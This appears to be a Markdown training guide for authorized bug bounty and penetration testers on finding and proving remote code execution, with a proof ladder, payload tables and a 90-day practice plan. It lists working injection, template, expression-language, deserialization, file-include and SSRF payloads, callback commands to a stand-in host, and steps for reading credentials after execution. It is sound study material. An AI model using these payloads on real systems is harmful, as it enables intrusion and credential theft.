# RCE mastery

Remote code execution is the class where a small input reaches an interpreter
that the attacker does not own. The hard part is not the payload. The hard part
is proving that the interpreter ran your syntax, with the least noise, and then
stopping before the target notices.

This file is the method shelf and the practice plan. `references/techniques.md`
has the short cards. `references/rce-curriculum.md` has the six week track.
`labs/rce` has a local target.

Everything here assumes written authorization. A lab, a program asset or a
signed scope counts.

## The proof ladder

Climb one rung at a time. Do not skip to a shell.

| Rung | Evidence | Strength |
|---|---|---|
| 0 | Error text changes after a metacharacter | Lead |
| 1 | Arithmetic or expression expands in the response | Evaluation |
| 2 | Command output appears, produced by your syntax | Execution |
| 3 | A callback arrives on a host you control | Execution, blind included |
| 4 | A file is written or a second command runs from the first | Control |
| 5 | A stable channel, reverse shell or tunnel | Access |

A report needs rung 2 or higher. Rung 1 is a template evaluation, not RCE. Rung
3 is enough when the response is blind, but the callback must include a unique
token tied to the request.

## Source to sink

Do this in the source before sending payloads.

1. List every input. Query, body, header, cookie, filename, JSON field, XML
   node, multipart part, archive entry and import URL.
2. Follow each input to a sink. Search for `exec`, `system`, `popen`, `shell`,
   `eval`, `include`, `require`, `render`, `compile`, `unserialize`, `load`,
   `fromYaml`, `ObjectInputStream`, `readObject`, `Process`, `spawn`.
3. Note the transform between source and sink. Concatenation, quoting,
   allowlist, regex, `escapeshellarg`, `shlex.quote`, JSON parse, template
   sandbox.
4. Find the missing check. A sink with an allowlist is still interesting when
   the allowlist is a prefix check or a regex without anchors.
5. Build the smallest input that reaches the sink with one metacharacter.

A scanner tells you where to read. It does not tell you what the transform is.

## Choose by surface

| Surface | First hypothesis | Skip when |
|---|---|---|
| `host`, `ip`, `domain`, `target` | Command injection | The app resolves with a library call |
| `q`, `name`, `message`, `title` rendered by a template | SSTI | The page is a static SPA with client rendering |
| `expr`, `calc`, `formula`, `rule` | Expression language | The math is done in JavaScript |
| `file`, `page`, `view`, `include`, `template` | LFI or template load | The path is mapped to a fixed enum |
| `url`, `webhook`, `import`, `feed` | SSRF to internal service | Egress is fully blocked and proven |
| File upload with any server side parser | Upload to execution | Files are stored on object storage only |
| Search or filter with an error | SQLi to RCE | The database runs with minimal rights |
| `data`, `state`, `token`, `session` in base64 or binary | Deserialization | The format is signed and verified first |
| Version banner with a recent CVE | Dependency RCE | The backport level is unknown |

## Command injection

Signal. The feature shells out. Ping, DNS lookup, PDF conversion, image
resize, archive unpack, git clone, backup, print.

Minimal probes, in order.

```text
127.0.0.1; echo $((6*7))
127.0.0.1 | echo $((6*7))
127.0.0.1 && echo $((6*7))
127.0.0.1 `echo 42`
127.0.0.1 $(echo 42)
```

On Windows, try `& echo 42`, `| echo 42` and `%COMSPEC%`.

Proof. The expanded value `42` appears and the literal `$((6*7))` does not.
Then try `; id`, `; uname -a` and one DNS callback.

Pitfalls. The value may be reflected by the app, not the shell. A quote style
can hide the separator. A shell can be `sh`, `bash`, `cmd`, PowerShell or a
language wrapper. `&&` fails when the first command exits non zero.

Escalation. Confirm the user, the working directory and the shell. Use an
out of band channel when output is swallowed. A file write is a good second
proof. A reverse shell is the last step.

Fix language. Use an argv list, not a shell string. If a shell is required,
quote with the platform primitive and validate the host against a strict
allowlist.

## Code and eval injection

Signal. A calculator, formula, rule builder or plugin field. The app evaluates
source, not data.

Probes.

```text
1+1
7*7
__import__('os').popen('id').read()        Python
process.mainModule.require('child_process').execSync('id')    Node
java.lang.Runtime.getRuntime().exec('id')  Java EL
```

Proof. The output appears, or the error names the evaluator.

Pitfalls. A calculator may use a parser, not `eval`. A sandbox may expose only
math. Python `eval` with an empty `__builtins__` still leaks through subclasses.
Node `vm` is not a security boundary.

## Server side template injection

Signal. Input is rendered inside a template. Invoice names, email templates,
preview panes, CMS pages, PDF generators.

Fingerprint with arithmetic, one engine family at a time.

| Payload | Engine family |
|---|---|
| `{{7*7}}` | Jinja2, Twig, Nunjucks, Handlebars-like |
| `${7*7}` | Freemarker, Velocity, JSP EL, Thymeleaf |
| `#{7*7}` | Ruby, some Java |
| `<%= 7*7 %>` | ERB, EJS |
| `{7*7}` | Smarty |
| `*{7*7}` | Thymeleaf |

Then split the family.

```text
{{7*'7'}}        Jinja2 gives 7777777, Twig gives 49
{{7/0}}          error text names the engine
${7*7}
```

Proof. The expression evaluates and a second expression with a different
operator also evaluates. For Jinja2, `{{config}}` and
`{{self.__class__}}` show the object graph. For Twig, `{{_self}}` and
`{{app.request}}` are useful.

Pitfalls. Client side template injection is not server side. A 49 in the page
can be a date. A sandbox blocks attributes differently per version. Angular
brackets are not Jinja.

Escalation. Jinja2 goes through `cycler`, `lipsum`, `joiner` or config to
`os.popen`. Twig goes through `_self` and filter chains. Freemarker uses
`Execute` or `ObjectConstructor`. Thymeleaf uses `T(java.lang.Runtime)` or
Spring beans. Always record the exact engine version.

## Expression language injection

Signal. Spring, Struts, Confluence, older Java stacks. Params named `expr`,
`message`, `redirect`, `view`.

Probes.

```text
${7*7}
%{7*7}
#{7*7}
T(java.lang.Runtime).getRuntime().exec('id')     SpEL
```

Proof. Evaluation, then a class reference. SpEL `T(...)` is a strong signal.
OGNL uses `@java.lang.Runtime@getRuntime().exec('id')`.

Pitfalls. Many apps print `${7*7}` literally because the expression is resolved
only in a specific parameter or body. Double evaluation exists. WAF rules often
block `T(` and `Runtime`.

## Deserialization

Signal. A blob in a cookie, hidden field, `viewstate`, `token`, `data` or
session. Magic bytes `AC ED` for Java, `O:` for PHP, `\x80\x04` for Python
pickle, `AAEAAAD` in base64 for .NET.

Probes.

1. Decode and identify the format.
2. Change one scalar and resend. A clean error proves the parser is reachable.
3. Generate a minimal object with a known side effect. `ysoserial` for Java,
   `phpggc` for PHP, a `__reduce__` pickle for Python.
4. For Java, try a DNS or HTTP gadget before a command gadget.

Proof. A callback or command from the crafted object.

Pitfalls. A serialized object with no gadget is a parser test, not RCE. A
signature can block tampering. Java gadget availability depends on the
classpath. PHP `unserialize` needs an autoloader or a gadget chain.

## Upload to execution

Signal. Any upload that lands in the web root or a directory a runtime reads.
Avatars, imports, plugin zips, themes, CSV feeds.

Method.

1. Upload a harmless text file. Find the stored URL and the response headers.
2. Test extension handling. `.php`, `.phtml`, `.php5`, `.jsp`, `.jspx`, `.aspx`,
   `.py`, case changes, double extension, trailing dot, null byte in old stacks.
3. Test MIME and magic byte checks separately. A `GIF89a` prefix plus code is a
   classic polyglot.
4. Check whether `.htaccess` or `web.config` can be uploaded and whether it is
   honored.
5. Check whether the file is executed or served as text. A source leak is not
   RCE.

Proof. A request to the stored file returns command output or a callback.

Pitfalls. A CDN can cache and serve the file as static. A resize step can strip
the payload. A zip upload may be unpacked outside the web root.

## LFI to RCE

Signal. A file parameter reads content. `file`, `page`, `view`, `include`,
`template`, `lang`.

Method.

1. Read a known file. `/etc/passwd` or the app config.
2. Identify the include style. PHP `include` executes PHP. Python `open` only
   reads. Java `include` can compile JSP.
3. PHP paths to execution are wrappers and writes. `php://filter` for source,
   `data://` when `allow_url_include` is on, `phar://` for deserialization,
   session files, access logs and `pearcmd.php`.
4. Log poisoning. Put PHP code in User-Agent, then include the access log.
5. Upload plus LFI is the reliable chain when an upload exists.

Proof. Command output from the included file.

Pitfalls. `php://filter` alone is disclosure. A log path differs per distro.
Log lines are URL encoded, so keep the payload free of characters that break
the surrounding syntax.

## SQL injection to RCE

Signal. Stacked queries or a database account with file and execution rights.

| DB | Path |
|---|---|
| MSSQL | `xp_cmdshell`, `sp_OACreate`, CLR |
| PostgreSQL | `COPY ... FROM PROGRAM`, `plpython`, `plperl` |
| MySQL | `INTO OUTFILE` to the web root, UDF |
| Oracle | Java stored procedures, `DBMS_SCHEDULER` |
| SQLite | `ATTACH`, extensions when enabled |

Proof. Command output, a written file that executes, or a callback.

Pitfalls. `xp_cmdshell` is often disabled. `secure_file_priv` blocks MySQL
writes. The web root path is unknown. A DB on another host cannot write to the
app host.

## SSRF to RCE

Signal. URL fetch, webhook, PDF renderer, image proxy, import.

Targets that turn SSRF into execution.

- Redis on 6379 with `CONFIG SET dir` and `dbfilename`, then `SAVE`.
- Docker API on 2375, create a container with a bind mount.
- Kubernetes kubelet 10250 or an unauthenticated API.
- Consul, Nomad, Jenkins, RabbitMQ management.
- Cloud metadata to a role, then the control plane.
- Internal admin panels with default credentials.
- Gopher is the strongest protocol when available. It can speak Redis and
  FastCGI.

Proof. A read from the internal service, then an action, then execution.

Pitfalls. A fetch error is not SSRF. DNS rebinding is blocked by some resolvers.
The egress path can be one host only.

## Dependency and appliance RCE

Signal. A version banner, a lockfile, a vendor appliance.

Method.

1. Map the exact product and version. A range is not enough.
2. Find the vendor advisory and the backport state.
3. Prefer a bug with a known safe check. Log4Shell, Spring4Shell, Text4Shell,
   Struts OGNL, Fastjson, Jackson, Confluence OGNL, Citrix, Fortinet, MOVEit.
4. Prove with the smallest callback. Do not drop a full exploit chain first.

Pitfalls. A banner can be a proxy. A patch level can be backported without a
version bump. A WAF can block the classic payload while the bug remains.

## Blind and out of band

When output is swallowed, use a channel you own.

| Channel | Probe | Proof |
|---|---|---|
| DNS | `nslookup <token>.oob.example` | Resolver log with time and source |
| HTTP | `curl https://<token>.oob.example` | Request line and source address |
| Time | `sleep 5` | Repeated delta against a baseline |
| File | write to a path you can fetch | The file content |

Use a unique token per request. Record the time. Repeat once to rule out jitter.
A DNS hit can come from a proxy, so pair it with the app behavior.

## Encoding and filters

Filters usually fail in one of three places. The separator, the command name or
the output.

- Separator blocked. Try newline `%0a`, backtick, `$()`, `&&`, `|`.
- Space blocked. `${IFS}`, `<`, `%09`, brace expansion.
- Slash blocked. `cd` into the directory, use `${PATH:0:1}`.
- Quotes blocked. Use the other quote, or a glob.
- Length limit. Write in stages, use a short URL, use base64.

Do not spend an hour on a WAF before you have rung 2 without the WAF.

## From execution to access

1. `id`, `hostname`, `pwd`, `uname -a`.
2. Read the app config for database and cloud credentials.
3. Check the metadata service and the environment.
4. Establish a stable channel only if the engagement allows it.
5. Keep the first proof request unchanged. A shell is not evidence by itself.

## Triage checklist

- Does the payload reach an interpreter, or only the response?
- Is the transform a concat, a quote, an allowlist or a parser?
- Is there a second independent proof?
- Is the callback unique and time stamped?
- Is the command safe and read only?
- Is the impact clear without a full shell?
- Did you preserve the request and the response?
- Did you stop at the agreed proof?

## Reporting RCE

Lead with the smallest request pair and the output. Name the sink and the
missing check. State the execution user. State whether the path is blind. Give
the fix in code terms, not a lecture.

```markdown
Title: Command injection in the ping tool reaches the shell
Asset: https://app.example/tools/ping
Precondition: authenticated low privilege user
Request: GET /tools/ping?host=127.0.0.1%3Bid
Result: uid=33(www-data) gid=33(www-data)
Sink: subprocess.run("ping -c1 " + host, shell=True)
Missing check: no quote and no allowlist
Impact: code execution as www-data, config and cloud role reachable
Fix: argv list or shlex.quote plus a host regex
Evidence: scans/rce.json, request and response hash
```

## Tooling

| Job | Tool |
|---|---|
| Intercept and replay | Burp Suite, Caido, mitmproxy |
| Template scan | SSTImap, tplmap |
| Command injection | commix, manual |
| Java deserialization | ysoserial, marshalsec, JNDIExploit |
| PHP deserialization | phpggc |
| Callback | interactsh, Burp Collaborator, a VPS with `tcpdump` |
| Encoding | CyberChef |
| Source to sink | semgrep, CodeQL, manual grep |
| Lab targets | `labs/rce`, PortSwigger, HackTheBox, VulnHub |

## 30 60 90 plan

### Days 1 to 30

- Finish weeks 1 and 2 of `references/rce-curriculum.md`.
- Solve ten PortSwigger labs across OS command injection and SSTI.
- Build a source to sink checklist for Python, Node, PHP and Java.
- Reproduce every class in `labs/rce` and write one page per class.

### Days 31 to 60

- Finish weeks 3 and 4.
- Add deserialization and LFI chains.
- Run a real source audit on two open source apps. Keep a trace for each sink.
- Build a callback server and practice blind proof.

### Days 61 to 90

- Finish weeks 5 and 6.
- Audit one Java and one PHP app end to end.
- Write a tool. A source to sink helper or a payload encoder is enough.
- Publish two writeups with request pairs.
- Ask a reviewer to break your proof. Fix the weak part.

## Drills

1. Name five sinks for each of Python, Node, PHP and Java.
2. Take a concat sink and write the bypass for single quote, double quote and
   no quote context.
3. Fingerprint six template engines without looking at the table. Score 5 of 6.
4. Build a pickle payload by hand and explain `__reduce__`.
5. Find the `secure_file_priv` path on a MySQL lab and write a file.
6. Run a blind command through DNS and show the resolver log.
7. Turn a log poisoning read into execution in the lab.
8. Write the fix for a command sink in two languages.
9. Take one CVE and reduce the public PoC to a one line check.
10. Explain why rung 1 is not RCE to a non technical reader.

## Rubric

Score each axis 0 to 3.

| Axis | 0 | 1 | 2 | 3 |
|---|---|---|---|---|
| Reach | Guess | Saw a sink | Traced input to sink | Proved with the smallest input |
| Proof | Error text | Arithmetic | Command output or callback | Second channel and control |
| Safety | No baseline | One baseline | Read only command | Time box and rollback note |
| Report | Payload dump | Steps | Request pair and fix | A triager can rerun it blind |

Nine or more means move on. Five to eight means repeat the class with a new
target. Below five means return to the source to sink drill.

## Reading

- PortSwigger Web Security Academy, OS command injection, SSTI and
  deserialization labs.
- OWASP WSTG, injection and file include sections.
- `PayloadsAllTheThings`, command injection and SSTI pages.
- `swisskyrepo/InternalAllTheThings` for SSRF to internal services.
- Vendor advisories for Log4Shell, Spring4Shell and Text4Shell.
- Project Zero and Assetnote writeups for parser and appliance bugs.
- `docs/attacking.md` and `references/techniques.md` for the Beril contract.
